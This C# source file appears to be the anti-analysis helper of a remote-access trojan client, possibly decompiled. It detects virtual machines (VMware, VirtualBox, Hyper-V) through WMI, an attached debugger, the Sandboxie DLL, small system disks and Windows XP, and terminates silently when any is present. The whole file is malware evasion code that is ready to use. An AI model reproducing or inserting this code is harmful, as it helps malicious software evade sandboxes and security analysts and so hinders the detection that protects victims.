using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper;

internal class Anti_Analysis
{
	public static void RunAntiAnalysis()
	{
		if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
		{
			Environment.FailFast(null);
		}
	}

	private static bool IsSmallDisk()
	{
		try
		{
			long num = 61000000000L;
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool IsXP()
	{
		try
		{
			if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool DetectManufacturer()
	{
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject item in managementObjectCollection)
			{
				string text = item["Manufacturer"].ToString().ToLower();
				if ((text == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || item["Model"].ToString() == "VirtualBox")
				{
					return true;
				}
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool DetectDebugger()
	{
		bool isDebuggerPresent = false;
		try
		{
			NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
			return isDebuggerPresent;
		}
	}

	private static bool DetectSandboxie()
	{
		try
		{
			if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}
}
